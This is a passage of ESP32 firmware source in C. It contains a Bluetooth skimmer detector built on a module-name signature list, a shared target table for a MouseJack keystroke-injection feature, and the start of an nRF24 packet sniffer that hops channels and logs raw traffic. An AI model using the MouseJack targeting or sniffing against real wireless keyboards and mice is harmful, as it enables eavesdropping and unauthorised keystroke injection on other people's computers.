  display_set_text_color_2(&(tft), titleColor, TFT_BLACK);
  display_set_cursor(&(tft), 10, y + 4);
  // Leave room for RSSI on the right so long names don't collide.
  {
    char shown[17];
    strncpy(shown, primary, sizeof(shown) - 1);
    shown[sizeof(shown) - 1] = '\0';
    display_print(&(tft), (TEXT(shown)).data);
  }

  char rssi[12];
  snprintf(rssi, sizeof(rssi), "%d dBm", (int)(*h).rssi);
  display_set_text_color_2(&(tft), detailColor, TFT_BLACK);
  const int rssiW = display_text_width(&(tft), rssi, 0);
  display_set_cursor(&(tft), SCREEN_WIDTH - 10 - rssiW, y + 4);
  display_print(&(tft), (TEXT(rssi)).data);

  char mac[20];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", (*h).mac[0],
           (*h).mac[1], (*h).mac[2], (*h).mac[3], (*h).mac[4], (*h).mac[5]);
  display_set_text_color_2(&(tft), detailColor, TFT_BLACK);
  display_set_cursor(&(tft), 10, y + 18);
  display_print(&(tft), (TEXT(mac)).data);

  if (selected) {
    display_fill_rect(&(tft), 2, y + 2, 3, BleSkimmer_ROW_H - 4, ORANGE);
  }
}

// Update only the dBm field — avoids wiping the whole row (no flicker).
static void BleSkimmer_paintRssiOnly(int listIndex, bool selected) {
  const int per = BleSkimmer_rowsPerPage();
  if (listIndex < 0 || listIndex >= per) {
    return;
  }
  const int absIndex = BleSkimmer_s_page * per + listIndex;
  if (absIndex < 0 || absIndex >= BleSkimmer_s_hitCount) {
    return;
  }
  const int y = BleSkimmer_LIST_Y + listIndex * BleSkimmer_ROW_H;
  if (y + BleSkimmer_ROW_H > BleSkimmer_listBottomY()) {
    return;
  }

  __auto_type h = &(BleSkimmer_s_hits[absIndex]);
  const uint16_t detailColor = selected ? ORANGE : UI_DIM_TEXT;
  char rssi[12];
  snprintf(rssi, sizeof(rssi), "%d dBm", (int)(*h).rssi);

  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);
  // Stay on the right edge so we never erase name/MAC.
  display_fill_rect(&(tft), SCREEN_WIDTH - 72, y + 2, 62, 12, TFT_BLACK);
  display_set_text_color_2(&(tft), detailColor, TFT_BLACK);
  const int rssiW = display_text_width(&(tft), rssi, 0);
  display_set_cursor(&(tft), SCREEN_WIDTH - 10 - rssiW, y + 4);
  display_print(&(tft), (TEXT(rssi)).data);
}

static void BleSkimmer_redrawList(void) {
  const int per = BleSkimmer_rowsPerPage();
  const int start = BleSkimmer_s_page * per;

  if (BleSkimmer_s_hitCount <= 0) {
    const int h = BleSkimmer_listBottomY() - BleSkimmer_LIST_Y;
    if (h > 0) {
      display_fill_rect(&(tft), 0, BleSkimmer_LIST_Y, SCREEN_WIDTH, h,
                        TFT_BLACK);
    }
    display_set_text_font(&(tft), 1);
    display_set_text_size(&(tft), 1);
    display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
    display_set_cursor(&(tft), 10, BleSkimmer_LIST_Y + 6);
    display_print(&(tft),
                  (TEXT(BleSkimmer_s_scanning ? "Listening for known skimmer"
                                              : "Press Start to begin"))
                      .data);
    display_set_cursor(&(tft), 10, BleSkimmer_LIST_Y + 18);
    display_print(&(tft),
                  (TEXT(BleSkimmer_s_scanning ? "Bluetooth module names..."
                                              : "scanning for suspects."))
                      .data);
    display_set_cursor(&(tft), 10, BleSkimmer_LIST_Y + 36);
    display_print(&(tft), "Looks for: HC-05, HM-10,");
    display_set_cursor(&(tft), 10, BleSkimmer_LIST_Y + 48);
    display_print(&(tft), "JDY, BT-05, and similar.");
    display_set_cursor(&(tft), 10, BleSkimmer_LIST_Y + 66);
    display_print(&(tft), "A match is a warning only,");
    display_set_cursor(&(tft), 10, BleSkimmer_LIST_Y + 78);
    display_print(&(tft), "not proof of a skimmer.");
    BleSkimmer_s_listDirty = false;
    return;
  }

  for (int i = 0; i < per; i++) {
    BleSkimmer_paintRow(i, (start + i) == BleSkimmer_s_selected);
  }
  BleSkimmer_s_listDirty = false;
  for (int i = 0; i < BleSkimmer_s_hitCount; i++) {
    BleSkimmer_s_hits[i].dirty = false;
  }
}

static void BleSkimmer_refreshDirtyRows(void) {
  const int per = BleSkimmer_rowsPerPage();
  const int start = BleSkimmer_s_page * per;
  bool any = BleSkimmer_s_listDirty;
  for (int i = start; i < start + per && i < BleSkimmer_s_hitCount; i++) {
    if (BleSkimmer_s_hits[i].dirty) {
      any = true;
      break;
    }
  }
  if (!any) {
    return;
  }
  for (int i = 0; i < per; i++) {
    const int absIndex = start + i;
    if (absIndex < BleSkimmer_s_hitCount &&
        (BleSkimmer_s_listDirty || BleSkimmer_s_hits[absIndex].dirty)) {
      BleSkimmer_paintRow(i, absIndex == BleSkimmer_s_selected);
      BleSkimmer_s_hits[absIndex].dirty = false;
    } else if (BleSkimmer_s_listDirty && absIndex >= BleSkimmer_s_hitCount) {
      BleSkimmer_paintRow(i, false);
    }
  }
  BleSkimmer_s_listDirty = false;
}

static void BleSkimmer_normalizeName(const char* in, char* out, size_t outSz) {
  size_t j = 0;
  for (size_t i = 0; in && in[i] && j + 1 < outSz; i++) {
    char c = in[i];
    if (c >= 'a' && c <= 'z') {
      c = (char)(c - 'a' + 'A');
    }
    if ((c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')) {
      out[j++] = c;
    }
  }
  out[j] = '\0';
}

static bool BleSkimmer_matchSignature(const char* rawName, char* labelOut,
                                      size_t labelSz, uint8_t* threatOut) {
  if (!rawName || !rawName[0]) {
    return false;
  }
  char norm[48];
  BleSkimmer_normalizeName(rawName, norm, sizeof(norm));
  if (!norm[0]) {
    return false;
  }

  // Any JDY-xx family member.
  if (strncmp(norm, "JDY", 3) == 0 && strlen(norm) >= 3) {
    strncpy(labelOut, "JDY-*", labelSz - 1);
    labelOut[labelSz - 1] = '\0';
    *threatOut = 4;
    return true;
  }

  for (size_t i = 0;
       i < sizeof(BleSkimmer_s_sigs) / sizeof(BleSkimmer_s_sigs[0]); i++) {
    if (strstr(norm, BleSkimmer_s_sigs[i].needle) != NULL) {
      strncpy(labelOut, BleSkimmer_s_sigs[i].label, labelSz - 1);
      labelOut[labelSz - 1] = '\0';
      *threatOut = BleSkimmer_s_sigs[i].threat;
      return true;
    }
  }
  return false;
}

static int BleSkimmer_findHitIndex(const uint8_t mac[6]) {
  for (int i = 0; i < BleSkimmer_s_hitCount; i++) {
    if (memcmp(BleSkimmer_s_hits[i].mac, mac, 6) == 0) {
      return i;
    }
  }
  return -1;
}

static bool BleSkimmer_upsertHit(const uint8_t mac[6], int8_t rssi,
                                 uint8_t threat, const char* label,
                                 const char* name) {
  const int idx = BleSkimmer_findHitIndex(mac);
  if (idx >= 0) {
    __auto_type h = &(BleSkimmer_s_hits[idx]);
    bool soft = false;
    (*h).rssi = rssi;
    (*h).hits++;
    if (threat > (*h).threat) {
      (*h).threat = threat;
    }
    if (label && label[0] && strcmp((*h).label, label) != 0) {
      strncpy((*h).label, label, BleSkimmer_LABEL_LEN - 1);
      (*h).label[BleSkimmer_LABEL_LEN - 1] = '\0';
      (*h).dirty = true;
      soft = true;
    }
    if (name && name[0] && strcmp((*h).name, name) != 0) {
      strncpy((*h).name, name, BleSkimmer_NAME_LEN - 1);
      (*h).name[BleSkimmer_NAME_LEN - 1] = '\0';
      (*h).dirty = true;
      soft = true;
    }
    return soft;
  }

  if (BleSkimmer_s_hitCount >= BleSkimmer_MAX_HITS) {
    int weakest = 0;
    for (int i = 1; i < BleSkimmer_s_hitCount; i++) {
      if (BleSkimmer_s_hits[i].rssi < BleSkimmer_s_hits[weakest].rssi) {
        weakest = i;
      }
    }
    if (rssi < BleSkimmer_s_hits[weakest].rssi) {
      return false;
    }
    memmove(
        &BleSkimmer_s_hits[weakest], &BleSkimmer_s_hits[weakest + 1],
        (size_t)(BleSkimmer_s_hitCount - weakest - 1) * sizeof(BleSkimmer_Hit));
    BleSkimmer_s_hitCount--;
  }

  __auto_type h = &(BleSkimmer_s_hits[BleSkimmer_s_hitCount++]);
  memcpy((*h).mac, mac, 6);
  (*h).rssi = rssi;
  (*h).threat = threat;
  (*h).hits = 1;
  (*h).label[0] = '\0';
  (*h).name[0] = '\0';
  if (label) {
    strncpy((*h).label, label, BleSkimmer_LABEL_LEN - 1);
    (*h).label[BleSkimmer_LABEL_LEN - 1] = '\0';
  }
  if (name) {
    strncpy((*h).name, name, BleSkimmer_NAME_LEN - 1);
    (*h).name[BleSkimmer_NAME_LEN - 1] = '\0';
  }
  (*h).dirty = true;
  BleSkimmer_s_listDirty = true;
  return true;
}

static void BleSkimmer_extractName(const ble_device_t* device, char* out,
                                   size_t outSz) {
  out[0] = '\0';
  if (!device || outSz < 2) {
    return;
  }
  text_t n = ble_device_name(device);
  if ((strlen((n).data) == 0)) {
    n = TEXT(ble_device_field_text(device, 0x09));
  }
  if ((strlen((n).data) == 0)) {
    n = TEXT(ble_device_field_text(device, 0x08));
  }
  if ((strlen((n).data) == 0)) {
    return;
  }
  strncpy(out, (n).data, outSz - 1);
  out[outSz - 1] = '\0';
  for (char* p = out; *p; ++p) {
    const unsigned char c = (unsigned char)*p;
    if (c < 32 || c > 126) {
      *p = '?';
    }
  }
  // Trim trailing spaces/junk so name compares/refreshes cleanly.
  for (int i = (int)strlen(out) - 1; i >= 0; --i) {
    if (out[i] == ' ' || out[i] == '?') {
      out[i] = '\0';
    } else {
      break;
    }
  }
}

static void BleSkimmer_on_result(const ble_device_t* device, void* context) {
  (void)context;
  if (!BleSkimmer_s_scanning || !device) {
    return;
  }

  char name[32];
  BleSkimmer_extractName(device, name, sizeof(name));

  char label[BleSkimmer_LABEL_LEN];
  uint8_t threat = 0;
  if (!BleSkimmer_matchSignature(name, label, sizeof(label), &threat)) {
    return;
  }

  text_t addrStr = ble_device_address(device);
  unsigned int b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0;
  if (sscanf((addrStr).data, "%02x:%02x:%02x:%02x:%02x:%02x", &b0, &b1, &b2,
             &b3, &b4, &b5) != 6) {
    return;
  }
  const uint8_t mac[6] = {(uint8_t)b0, (uint8_t)b1, (uint8_t)b2,
                          (uint8_t)b3, (uint8_t)b4, (uint8_t)b5};

  portENTER_CRITICAL(&BleSkimmer_s_mux);
  if (BleSkimmer_upsertHit(mac, (int8_t)device->rssi, threat, label, name)) {
    BleSkimmer_s_hasUpdates = true;
  }
  portEXIT_CRITICAL(&BleSkimmer_s_mux);
}

static void BleSkimmer_stopScan(void) {
  if (BleSkimmer_s_scan) {
    ble_scan_stop(BleSkimmer_s_scan);
    ble_scan_set_callback(BleSkimmer_s_scan, NULL, NULL);
  }
  BleSkimmer_s_scanning = false;
}

static void BleSkimmer_startScan(void) {
  if (!BleSkimmer_s_scan) {
    ensureBleStackReady();
    BleSkimmer_s_scan = ble_service_scan();
  }
  ble_scan_stop(BleSkimmer_s_scan);
  ble_scan_set_callback(BleSkimmer_s_scan, BleSkimmer_on_result, NULL);
  (BleSkimmer_s_scan->active = true);
  (BleSkimmer_s_scan->interval_ms = 100);
  (BleSkimmer_s_scan->window_ms = 50);
  (BleSkimmer_s_scan->duplicate_filter = false);
  BleSkimmer_s_scanning = true;
  ble_scan_start(BleSkimmer_s_scan, 0, false);
}

static void BleSkimmer_clearHits(void) {
  portENTER_CRITICAL(&BleSkimmer_s_mux);
  BleSkimmer_s_hitCount = 0;
  BleSkimmer_s_drawnCount = 0;
  BleSkimmer_s_selected = 0;
  BleSkimmer_s_page = 0;
  BleSkimmer_s_listDirty = true;
  BleSkimmer_s_hasUpdates = true;
  portEXIT_CRITICAL(&BleSkimmer_s_mux);
}

static void BleSkimmer_clampSelection(void) {
  const int per = BleSkimmer_rowsPerPage();
  if (BleSkimmer_s_hitCount <= 0) {
    BleSkimmer_s_selected = 0;
    BleSkimmer_s_page = 0;
    return;
  }
  if (BleSkimmer_s_selected >= BleSkimmer_s_hitCount) {
    BleSkimmer_s_selected = BleSkimmer_s_hitCount - 1;
  }
  if (BleSkimmer_s_selected < 0) {
    BleSkimmer_s_selected = 0;
  }
  BleSkimmer_s_page = BleSkimmer_s_selected / per;
}

static void BleSkimmer_handleButtons(void) {
  const unsigned long now = sys_monotonic_ms();
  if (now - BleSkimmer_s_lastBtnMs < BleSkimmer_BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (BleSkimmer_s_scanning) {
      BleSkimmer_stopScan();
    } else {
      BleSkimmer_startScan();
    }
    BleSkimmer_updateHeader(true);
    BleSkimmer_updateNavLabels();
    BleSkimmer_s_listDirty = true;
    BleSkimmer_s_drawnCount = 0;
    BleSkimmer_redrawList();
    BleSkimmer_s_drawnCount = BleSkimmer_s_hitCount;
    BleSkimmer_s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    BleSkimmer_clearHits();
    BleSkimmer_updateHeader(true);
    BleSkimmer_redrawList();
    BleSkimmer_s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    if (BleSkimmer_s_hitCount <= 0) {
      return;
    }
    const int prev = BleSkimmer_s_selected;
    BleSkimmer_s_selected = (BleSkimmer_s_selected <= 0)
                                ? (BleSkimmer_s_hitCount - 1)
                                : (BleSkimmer_s_selected - 1);
    BleSkimmer_clampSelection();
    if (BleSkimmer_s_selected / BleSkimmer_rowsPerPage() !=
        prev / BleSkimmer_rowsPerPage()) {
      BleSkimmer_s_listDirty = true;
      BleSkimmer_s_drawnCount = 0;
      BleSkimmer_redrawList();
      BleSkimmer_s_drawnCount = BleSkimmer_s_hitCount;
    } else {
      const int per = BleSkimmer_rowsPerPage();
      BleSkimmer_paintRow(prev % per, false);
      BleSkimmer_paintRow(BleSkimmer_s_selected % per, true);
    }
    BleSkimmer_s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (BleSkimmer_s_hitCount <= 0) {
      return;
    }
    const int prev = BleSkimmer_s_selected;
    BleSkimmer_s_selected = (BleSkimmer_s_selected + 1) % BleSkimmer_s_hitCount;
    BleSkimmer_clampSelection();
    if (BleSkimmer_s_selected / BleSkimmer_rowsPerPage() !=
        prev / BleSkimmer_rowsPerPage()) {
      BleSkimmer_s_listDirty = true;
      BleSkimmer_s_drawnCount = 0;
      BleSkimmer_redrawList();
      BleSkimmer_s_drawnCount = BleSkimmer_s_hitCount;
    } else {
      const int per = BleSkimmer_rowsPerPage();
      BleSkimmer_paintRow(prev % per, false);
      BleSkimmer_paintRow(BleSkimmer_s_selected % per, true);
    }
    BleSkimmer_s_lastBtnMs = now;
    return;
  }
}

static void BleSkimmer_runUI(void) {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};
  if (!BleSkimmer_s_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i]) {
        display_draw_bitmap(&(tft), BleSkimmer_iconX[i], BleSkimmer_iconY,
                            icons[i], ICON_SIZE, ICON_SIZE, ORANGE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    BleSkimmer_s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > BleSkimmer_iconX[i] && x < BleSkimmer_iconX[i] + ICON_SIZE) {
            feature_exit_requested = true;
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

static void BleSkimmer_teardown(void) {
  BleSkimmer_stopScan();
  BleSkimmer_s_scan = NULL;
}

void BleSkimmer_bleSkimmerSetup(void) {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);
  setupTouchscreen();

  BleSkimmer_s_uiDrawn = false;
  BleSkimmer_s_chromeDrawn = false;
  BleSkimmer_s_scanning = false;
  BleSkimmer_s_listDirty = true;
  BleSkimmer_s_hitCount = 0;
  BleSkimmer_s_drawnCount = 0;
  BleSkimmer_s_selected = 0;
  BleSkimmer_s_page = 0;
  BleSkimmer_s_hasUpdates = false;
  BleSkimmer_s_lastBtnMs = 0;
  BleSkimmer_s_lastUiMs = 0;
  BleSkimmer_s_cacheFound[0] = '\0';
  BleSkimmer_s_cacheState[0] = '\0';
  BleSkimmer_s_scan = NULL;

  {
    ble_scan_t* existing = ble_service_scan();
    if (existing) {
      ble_scan_stop(existing);
    }
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();
  BleSkimmer_runUI();
  BleSkimmer_updateNavLabels();
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  BleSkimmer_updateHeader(true);
  BleSkimmer_redrawList();

  BleSkimmer_startScan();
  BleSkimmer_updateHeader(true);
  BleSkimmer_updateNavLabels();
}

void BleSkimmer_bleSkimmerLoop(void) {
  if (feature_exit_requested) {
    BleSkimmer_teardown();
    return;
  }
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    BleSkimmer_teardown();
    feature_exit_requested = true;
    return;
  }

  BleSkimmer_handleButtons();
  BleSkimmer_runUI();

  static unsigned long s_lastStatusMs = 0;
  static unsigned long s_lastRssiMs = 0;
  const unsigned long now = sys_monotonic_ms();
  if (now - s_lastStatusMs >= 1000) {
    s_lastStatusMs = now;
    updateStatusBar();
  }
  maintainTouchNavBar();

  // New suspects or name/MAC text changes.
  if (BleSkimmer_s_hasUpdates || BleSkimmer_s_listDirty) {
    bool need = false;
    bool full = false;
    int hitCount = 0;
    portENTER_CRITICAL(&BleSkimmer_s_mux);
    need = BleSkimmer_s_hasUpdates || BleSkimmer_s_listDirty;
    full = BleSkimmer_s_listDirty;
    BleSkimmer_s_hasUpdates = false;
    BleSkimmer_s_listDirty = false;
    hitCount = BleSkimmer_s_hitCount;
    portEXIT_CRITICAL(&BleSkimmer_s_mux);

    if (need) {
      BleSkimmer_clampSelection();
      if (full || hitCount != BleSkimmer_s_drawnCount) {
        BleSkimmer_updateHeader(true);
        BleSkimmer_redrawList();
        BleSkimmer_s_drawnCount = hitCount;
        s_lastRssiMs = now;
      } else {
        // Name/label changed on an existing row — repaint that row only.
        BleSkimmer_refreshDirtyRows();
      }
    }
  }

  // Live RSSI about once per second — only the dBm text, not the whole row.
  if (BleSkimmer_s_hitCount > 0 && (now - s_lastRssiMs >= 1000)) {
    s_lastRssiMs = now;
    const int per = BleSkimmer_rowsPerPage();
    const int start = BleSkimmer_s_page * per;
    for (int i = 0; i < per; i++) {
      const int absIndex = start + i;
      if (absIndex >= BleSkimmer_s_hitCount) {
        break;
      }
      BleSkimmer_paintRssiOnly(i, absIndex == BleSkimmer_s_selected);
    }
  }

  if (BleSkimmer_s_scanning && BleSkimmer_s_scan &&
      !ble_scan_is_active(BleSkimmer_s_scan)) {
    ble_scan_start(BleSkimmer_s_scan, 0, false);
  }

  if (feature_exit_requested) {
    BleSkimmer_teardown();
  }
}

void BleSkimmer_exit(void) { BleSkimmer_teardown(); }

// Shared MouseJack targets: scanner publishes, inject consumes.
enum { kMjSharedMax = 12 };
typedef struct MjSharedTarget {
  uint8_t addr[5];
  uint8_t channel;
  bool used;
  bool vulnerable;
  char vendor[12];
  uint16_t hits;
} MjSharedTarget;
#define MjSharedTarget_INITIALIZER \
  {.channel = 0, .used = false, .vulnerable = false, .vendor = {0}, .hits = 0}
;
static MjSharedTarget g_mjShared[kMjSharedMax];

static void mjSharedPublish(const uint8_t* addr, uint8_t ch, bool vulnerable,
                            const char* vendor) {
  int idx = -1;
  for (int i = 0; i < kMjSharedMax; i++) {
    if (g_mjShared[i].used && memcmp(g_mjShared[i].addr, addr, 5) == 0) {
      idx = i;
      break;
    }
  }
  if (idx < 0) {
    for (int i = 0; i < kMjSharedMax; i++) {
      if (!g_mjShared[i].used) {
        idx = i;
        break;
      }
    }
    if (idx < 0) {
      idx = 0;
    }
    memset(&g_mjShared[idx], 0, sizeof(MjSharedTarget));
    memcpy(g_mjShared[idx].addr, addr, 5);
    g_mjShared[idx].used = true;
  }
  g_mjShared[idx].channel = ch;
  g_mjShared[idx].hits++;
  if (vulnerable) {
    g_mjShared[idx].vulnerable = true;
  }
  if (vendor && vendor[0]) {
    strncpy(g_mjShared[idx].vendor, vendor, sizeof(g_mjShared[idx].vendor) - 1);
  }
}

static spi_device_t EsbSniffer_radio_transport;

#undef CE
#define CE NRF24_SCAN_CE
#undef CSN
#define CSN NRF24_SCAN_CSN

#undef _ESB_CONFIG
#define _ESB_CONFIG 0x00
#undef _ESB_EN_AA
#define _ESB_EN_AA 0x01
#undef _ESB_EN_RXADDR
#define _ESB_EN_RXADDR 0x02
#undef _ESB_SETUP_AW
#define _ESB_SETUP_AW 0x03
#undef _ESB_SETUP_RETR
#define _ESB_SETUP_RETR 0x04
#undef _ESB_RF_CH
#define _ESB_RF_CH 0x05
#undef _ESB_RF_SETUP
#define _ESB_RF_SETUP 0x06
#undef _ESB_STATUS
#define _ESB_STATUS 0x07
#undef _ESB_RX_ADDR_P0
#define _ESB_RX_ADDR_P0 0x0A
#undef _ESB_RX_PW_P0
#define _ESB_RX_PW_P0 0x11
#undef _ESB_FIFO_STATUS
#define _ESB_FIFO_STATUS 0x17

enum { EsbSniffer_kEsbPayloadMax = 32 };
enum { EsbSniffer_kEsbMaxLogLines = 16 };
enum { EsbSniffer_kEsbStatusLines = 4 };
enum { EsbSniffer_kEsbLineHeight = 12 };
enum { EsbSniffer_kEsbToolbarBottom = 36 };
enum { EsbSniffer_kEsbToolbarGap = 8 };
enum {
  EsbSniffer_kEsbStatusY = EsbSniffer_kEsbToolbarBottom +
  EsbSniffer_kEsbToolbarGap
};
enum { EsbSniffer_kEsbBoxHeaderH = 15 };
enum {
  EsbSniffer_kEsbStatusTextY = EsbSniffer_kEsbStatusY +
  EsbSniffer_kEsbBoxHeaderH
};
enum {
  EsbSniffer_kEsbStatusBoxH = EsbSniffer_kEsbBoxHeaderH +
  (EsbSniffer_kEsbStatusLines * EsbSniffer_kEsbLineHeight) + 4
};
enum { EsbSniffer_kEsbLogGap = 4 };
enum {
  EsbSniffer_kEsbLogBoxTop = EsbSniffer_kEsbStatusY +
  EsbSniffer_kEsbStatusBoxH + EsbSniffer_kEsbLogGap
};
enum {
  EsbSniffer_kEsbLogStartY = EsbSniffer_kEsbLogBoxTop +
  EsbSniffer_kEsbBoxHeaderH
};
enum { EsbSniffer_kEsbLogBottomPad = 4 };
enum { EsbSniffer_kEsbFlushIntervalMs = 2000 };
enum { EsbSniffer_kEsbHopIntervalMs = 80 };
static const char* EsbSniffer_kEsbDir = "/esb";
static const char* EsbSniffer_kEsbFilePrefix = "/esb/esb_";

static bool EsbSniffer_uiDrawn = false;
static volatile bool EsbSniffer_sniffing = false;
static uint8_t EsbSniffer_s_channel = 76;
static bool EsbSniffer_s_hopping = false;
static bool EsbSniffer_s_logEnabled = true;
static bool EsbSniffer_s_sdReady = false;
static bool EsbSniffer_s_logFileOpen = false;
static text_t EsbSniffer_s_logPath = {0};
static storage_file_t EsbSniffer_s_logFile = {0};
static uint32_t EsbSniffer_s_packetTotal = 0;
static uint32_t EsbSniffer_s_rateCount = 0;
static uint32_t EsbSniffer_s_rateLastMs = 0;
static uint32_t EsbSniffer_s_ratePerSec = 0;
static uint32_t EsbSniffer_s_lastFlushMs = 0;
static uint32_t EsbSniffer_s_lastHopMs = 0;
static int EsbSniffer_s_hopIndex = 0;

enum {
  EsbSniffer_s_logBuffer_COUNT = EsbSniffer_kEsbMaxLogLines,
  EsbSniffer_s_logBuffer_OFFSET = 0
};
_Static_assert(EsbSniffer_s_logBuffer_OFFSET + EsbSniffer_s_logBuffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define EsbSniffer_s_logBuffer                  \
  (*(text_t(*)[EsbSniffer_s_logBuffer_COUNT]) & \
   feature_text_slots[EsbSniffer_s_logBuffer_OFFSET])
static uint16_t EsbSniffer_s_logColor[EsbSniffer_kEsbMaxLogLines];
static int EsbSniffer_s_logIndex = 0;

enum {
  EsbSniffer_s_statusText_COUNT = EsbSniffer_kEsbStatusLines,
  EsbSniffer_s_statusText_OFFSET = EsbSniffer_s_logBuffer_OFFSET +
      EsbSniffer_s_logBuffer_COUNT
};
_Static_assert(EsbSniffer_s_statusText_OFFSET + EsbSniffer_s_statusText_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define EsbSniffer_s_statusText                  \
  (*(text_t(*)[EsbSniffer_s_statusText_COUNT]) & \
   feature_text_slots[EsbSniffer_s_statusText_OFFSET])
static uint16_t EsbSniffer_s_statusColor[EsbSniffer_kEsbStatusLines];
static int EsbSniffer_s_statusDrawnW[EsbSniffer_kEsbStatusLines];

enum {
  EsbSniffer_s_logDrawn_COUNT = EsbSniffer_kEsbMaxLogLines,
  EsbSniffer_s_logDrawn_OFFSET = EsbSniffer_s_statusText_OFFSET +
      EsbSniffer_s_statusText_COUNT
};
_Static_assert(EsbSniffer_s_logDrawn_OFFSET + EsbSniffer_s_logDrawn_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define EsbSniffer_s_logDrawn                  \
  (*(text_t(*)[EsbSniffer_s_logDrawn_COUNT]) & \
   feature_text_slots[EsbSniffer_s_logDrawn_OFFSET])
static uint16_t EsbSniffer_s_logDrawnColor[EsbSniffer_kEsbMaxLogLines];
static int EsbSniffer_s_logDrawnW[EsbSniffer_kEsbMaxLogLines];

static bool EsbSniffer_s_esbLogDirty = false;
static bool EsbSniffer_s_esbStatusDirty = false;
static uint32_t EsbSniffer_s_esbLastUiMs = 0;
enum { EsbSniffer_kEsbUiMinIntervalMs = 100 };

static int EsbSniffer_esbLogBoxBottom(void) {
  return bleContentBottom() - EsbSniffer_kEsbLogBottomPad;
}

static int EsbSniffer_esbLogBoxH(void) {
  const int h = EsbSniffer_esbLogBoxBottom() - EsbSniffer_kEsbLogBoxTop;
  return h > (EsbSniffer_kEsbBoxHeaderH + EsbSniffer_kEsbLineHeight)
             ? h
             : (EsbSniffer_kEsbBoxHeaderH + EsbSniffer_kEsbLineHeight);
}

static int EsbSniffer_esbLogEndY(void) {
  return EsbSniffer_kEsbLogBoxTop + EsbSniffer_esbLogBoxH() - 2;
}

static int EsbSniffer_esbVisibleLogLines(void) {
  const int avail = EsbSniffer_esbLogEndY() - EsbSniffer_kEsbLogStartY;
  if (avail <= 0) {
    return 1;
  }
  const int n = avail / EsbSniffer_kEsbLineHeight;
  if (n < 1) {
    return 1;
  }
  return n > EsbSniffer_kEsbMaxLogLines ? EsbSniffer_kEsbMaxLogLines : n;
}

static const uint8_t EsbSniffer_kHopChannels[] = {2,  5,  10, 26, 40, 50, 60,
                                                  70, 76, 78, 79, 80, 83};
enum {
  EsbSniffer_kHopCount = sizeof(EsbSniffer_kHopChannels) /
  sizeof(EsbSniffer_kHopChannels[0])
};

static const uint8_t EsbSniffer_kPromiscAddr[5] = {0xAA, 0xAA, 0xAA, 0xAA,
                                                   0xAA};

static uint8_t EsbSniffer_esbGetRegister(uint8_t r) {
  uint8_t c;
  spi_device_select(&(EsbSniffer_radio_transport));
  spi_device_transfer(&(EsbSniffer_radio_transport), r & 0x1F);
  c = spi_device_transfer(&(EsbSniffer_radio_transport), 0);
  spi_device_deselect(&(EsbSniffer_radio_transport));
  return c;
}

static void EsbSniffer_esbSetRegister(uint8_t r, uint8_t v) {
  spi_device_select(&(EsbSniffer_radio_transport));
  spi_device_transfer(&(EsbSniffer_radio_transport), (r & 0x1F) | 0x20);
  spi_device_transfer(&(EsbSniffer_radio_transport), v);
  spi_device_deselect(&(EsbSniffer_radio_transport));
}

static void EsbSniffer_esbWriteRegMulti(uint8_t reg, const uint8_t* data,
                                        uint8_t len) {
  spi_device_select(&(EsbSniffer_radio_transport));
  spi_device_transfer(&(EsbSniffer_radio_transport), (reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) {
    spi_device_transfer(&(EsbSniffer_radio_transport), data[i]);
  }
  spi_device_deselect(&(EsbSniffer_radio_transport));
}

static void EsbSniffer_esbDisable(void) {
  gpio_set_level(((gpio_num_t)(CE)), 0);
}

static void EsbSniffer_esbEnable(void) {
  gpio_set_level(((gpio_num_t)(CE)), 1);
}

static void EsbSniffer_esbPowerUp(void) {
  EsbSniffer_esbSetRegister(_ESB_CONFIG,
                            EsbSniffer_esbGetRegister(_ESB_CONFIG) | 0x02);
  esp_rom_delay_us(130);
}

static void EsbSniffer_esbPowerDown(void) {
  EsbSniffer_esbSetRegister(_ESB_CONFIG,
                            EsbSniffer_esbGetRegister(_ESB_CONFIG) & ~0x02);
}

static void EsbSniffer_esbFlushRx(void) {
  spi_device_select(&(EsbSniffer_radio_transport));
  spi_device_transfer(&(EsbSniffer_radio_transport), 0xE2);
  spi_device_deselect(&(EsbSniffer_radio_transport));
}

static void EsbSniffer_esbInitRadioSpi(void) {
  spi_device_init(&(EsbSniffer_radio_transport), DIV_SD_HOST, SD_SCLK, SD_MISO,
